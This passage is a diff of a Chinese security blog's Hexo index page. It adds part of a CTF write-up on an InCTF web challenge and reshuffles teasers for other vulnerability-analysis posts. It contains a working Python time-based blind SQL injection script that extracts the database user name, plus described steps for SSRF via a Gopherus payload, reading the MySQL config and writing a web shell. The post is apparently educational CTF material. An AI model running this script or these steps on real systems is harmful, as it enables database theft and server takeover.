req=requests.get(query)</span></span><br><span class="line"><span class="string">	end=time()</span></span><br><span class="line"><span class="string">	if((end-start)&gt;=2):</span></span><br><span class="line"><span class="string">		len_user=i</span></span><br><span class="line"><span class="string">		break</span></span><br><span class="line"><span class="string">	print (i)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">print(<span class="string">"Got the user length : "</span> + str(len_user))</span><br><span class="line"></span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">iterate</span><span class="params">()</span>:</span></span><br><span class="line">	temp=<span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(flag),<span class="number">2</span>):</span><br><span class="line">		temp+=<span class="string">"&#123;:b&#125;"</span>.format(int(flag[i:i+<span class="number">2</span>])).rjust(<span class="number">8</span>,<span class="string">"0"</span>)</span><br><span class="line">	<span class="keyword">return</span> temp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,len_user+<span class="number">1</span>):</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">64</span>,<span class="number">122</span>):</span><br><span class="line">		query=url + <span class="string">"!having%0asleep(((select%0ainsert(user(),"</span> + str(j+<span class="number">1</span>) + <span class="string">",255,space(0)))%0ain%0a(select%0a0b"</span> + iterate() + <span class="string">"&#123;:b&#125;"</span>.format(i).rjust(<span class="number">8</span>,<span class="string">"0"</span>)  + <span class="string">"))*3);%00"</span></span><br><span class="line">		print(query)</span><br><span class="line">		<span class="keyword">if</span> i == <span class="number">65</span>:</span><br><span class="line">			exit()</span><br><span class="line">		start=time()</span><br><span class="line">		req=requests.get(query)</span><br><span class="line">		end=time()</span><br><span class="line">		<span class="keyword">if</span>((end-start)&gt;=<span class="number">2</span>):</span><br><span class="line">			flag+=str(i)</span><br><span class="line">			user_name +=chr(i)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		print(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (<span class="string">"Got the user name: "</span> + user_name)</span><br></pre></td></tr></table></figure>
+<p>得到username:INCTF_SSRF</p>
+<p>之后利用了这款工具:<a href="https://github.com/tarunkant/Gopherus" target="_blank" rel="noopener">https://github.com/tarunkant/Gopherus</a></p>
+<p>构造payload后查看用户读写权限</p>
+<p><img src="/2018/10/09/Inctf-HackoverCTF-Web部分题目解析/D:/hexo\source\_posts\Inctf-HackoverCTF-Web部分题目解析\34.png" alt=""></p>
+<p>应该可以读写的，尝试下读取<code>/etc/mysql/mysql.conf.d/mysqld.cnf</code>这是MySQL的配置文件，可以看到能够写入文件到哪里</p>
+<p><img src="/2018/10/09/Inctf-HackoverCTF-Web部分题目解析/D:/hexo\source\_posts\Inctf-HackoverCTF-Web部分题目解析\11.png" alt=""></p>
+<p>看出来给了提示/tmp_is_great</p>
+<p>于是写shell到/tmp_is_great,最后测试下shell</p>
+<p><img src="/2018/10/09/Inctf-HackoverCTF-Web部分题目解析/D:/hexo\source\_posts\Inctf-HackoverCTF-Web部分题目解析\10.png" alt=""></p>
+<p>最后只要cat 一下flag文件就可以啦</p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/06/XiaoCMS漏洞分析/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -405,170 +674,6 @@
           <!--noindex-->
           <div class="post-button text-center">
             <a class="btn" href="/2018/10/06/XiaoCMS漏洞分析/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/05/PHPSHE1-5漏洞分析/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Noel">
-      <meta itemprop="description" content="I love u">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Noel's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/10/05/PHPSHE1-5漏洞分析/" itemprop="url">
-                  PHPSHE1.5漏洞分析
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2018-10-05 00:00:00 / 修改时间：13:06:45" itemprop="dateCreated datePublished" datetime="2018-10-05T00:00:00+08:00">2018-10-05</time>
-            
-
-            
-              
-
-              
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/代码审计/" itemprop="url" rel="index"><span itemprop="name">代码审计</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <p>PHPSHE1.5后台存在大量SQL注入漏洞，以及一些其他漏洞，这次就找一些来进行分析</p>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2018/10/05/PHPSHE1-5漏洞分析/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -745,6 +850,170 @@
           <!--noindex-->
           <div class="post-button text-center">
             <a class="btn" href="/2018/10/05/VulnHub-LazySysAdmin/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/05/PHPSHE1-5漏洞分析/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Noel">
+      <meta itemprop="description" content="I love u">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Noel's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/10/05/PHPSHE1-5漏洞分析/" itemprop="url">
+                  PHPSHE1.5漏洞分析
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2018-10-05 00:00:00 / 修改时间：13:06:45" itemprop="dateCreated datePublished" datetime="2018-10-05T00:00:00+08:00">2018-10-05</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/代码审计/" itemprop="url" rel="index"><span itemprop="name">代码审计</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <p>PHPSHE1.5后台存在大量SQL注入漏洞，以及一些其他漏洞，这次就找一些来进行分析</p>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/10/05/PHPSHE1-5漏洞分析/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -1830,167 +2099,13 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/27/hello-world/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Noel">
-      <meta itemprop="description" content="I love u">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Noel's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/09/27/hello-world/" itemprop="url">
-                  Hello World
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2018-09-27 21:41:26" itemprop="dateCreated datePublished" datetime="2018-09-27T21:41:26+08:00">2018-09-27</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">更新于</span>
-                
-                <time title="修改时间：2018-10-02 01:45:17" itemprop="dateModified" datetime="2018-10-02T01:45:17+08:00">2018-10-02</time>
-              
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.<br></p>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2018/09/27/hello-world/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
+  <nav class="pagination">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+  </nav>
+
 
 
           </div>
@@ -2031,7 +2146,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">10</span>
+                    <span class="site-state-item-count">11</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
@@ -2052,7 +2167,9 @@
                     
                       
                     
-                    <span class="site-state-item-count">4</span>
+                      
+                    
+                    <span class="site-state-item-count">5</span>
                     <span class="site-state-item-name">分类</span>
                   </a>
                 </div>
